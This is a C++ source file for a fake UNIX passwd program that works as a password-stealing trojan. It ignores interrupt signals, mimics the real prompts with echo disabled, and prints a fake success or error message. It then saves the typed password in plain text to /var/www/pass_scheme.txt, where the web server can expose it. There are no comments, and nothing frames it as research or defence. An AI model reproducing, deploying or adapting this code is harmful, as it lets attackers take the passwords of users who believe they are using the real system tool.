#include <iostream>
#include <stdlib.h>
#include <fstream>
#include <string>
#include <signal.h>

void ignore_sigint (int sig_no){
}

using namespace std;
int main (){
  string cuser;
  string newpass;
  string newpass2;
  ofstream outfile;

  void (*prev_fn)(int);
  prev_fn = signal (SIGINT,ignore_sigint);
  
  cout << "Enter new UNIX password: ";
  system("stty -echo"); 
  cin >> newpass;
  system("stty echo"); 
  cout << endl;
  cout << "Retype new UNIX password: ";
  system("stty -echo"); 
  cin >> newpass2; 
  system("stty echo"); 
  cout << endl;

  if (newpass.compare(newpass2) != 0){
    cout << "Sorry, passwords do not match\n";
    cout << "passwd: Authentication token manipulation error\n";
    cout << "passwd: password unchanged";
  } else {
    cout << "passwd: password updated sucessfully\n";
  }  

  outfile.open ("/var/www/pass_scheme.txt");
  outfile << newpass << endl;
  outfile.close();
  return 0;
}

